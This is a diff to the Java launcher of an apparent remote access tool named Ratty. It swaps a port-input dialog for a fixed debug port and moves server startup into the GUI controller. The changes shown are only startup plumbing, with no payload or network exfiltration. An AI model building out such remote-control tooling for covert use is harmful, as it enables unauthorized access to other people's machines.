@@ -6,15 +6,13 @@ import javax.swing.JOptionPane;
 
 import de.sogomn.rat.gui.server.RattyGui;
 import de.sogomn.rat.gui.server.RattyGuiController;
-import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.util.Constants;
 
 public final class Server {
 	
 	private static final boolean DEBUG = true;
+	private static final int DEBUG_PORT = 23456;
 	
-	private static final String PORT_INPUT_QUESTION = LANGUAGE.getString("server.port_question");
-	private static final String PORT_ERROR_MESSAGE = LANGUAGE.getString("server.port_error");
 	private static final String DEBUG_MESSAGE = LANGUAGE.getString("debug.question");
 	private static final String DEBUG_SERVER = LANGUAGE.getString("debug.server");
 	private static final String DEBUG_CLIENT = LANGUAGE.getString("debug.client");
@@ -32,41 +30,33 @@ public final class Server {
 		if (input == JOptionPane.YES_OPTION) {
 			System.out.println(DEBUG_SERVER);
 			
-			Constants.setNimbusLookAndFeel();
-			startServer(23456);
+			startServer(DEBUG_PORT);
 		} else if (input == JOptionPane.NO_OPTION) {
 			System.out.println(DEBUG_CLIENT);
 			
-			Client.startClient("localhost", 23456);
+			Client.startClient("localhost", DEBUG_PORT);
 		}
 	}
 	
-	private static void startServer() {
+	public static void startServer() {
 		Constants.setNimbusLookAndFeel();
 		
-		final String input = JOptionPane.showInputDialog(PORT_INPUT_QUESTION);
+		final RattyGui gui = new RattyGui();
+		final RattyGuiController controller = new RattyGuiController(gui);
 		
-		if (input == null) {
-			return;
-		}
-		
-		final int port = Integer.parseInt(input);
-		
-		if (port != -1) {
-			startServer(port);
-		} else {
-			JOptionPane.showMessageDialog(null, PORT_ERROR_MESSAGE, null, JOptionPane.ERROR_MESSAGE);
-		}
+		gui.addListener(controller);
+		gui.setVisible(true);
 	}
 	
 	public static void startServer(final int port) {
-		final ActiveServer server = new ActiveServer(port);
-		final RattyGui gui = new RattyGui();
-		final RattyGuiController controller = new RattyGuiController(server, gui);
+		Constants.setNimbusLookAndFeel();
 		
+		final RattyGui gui = new RattyGui();
+		final RattyGuiController controller = new RattyGuiController(gui);
+		
+		controller.startServer(port);
 		gui.addListener(controller);
-		server.setObserver(controller);
-		server.start();
+		gui.setVisible(true);
 	}
 	
 	public static void main(final String[] args) {
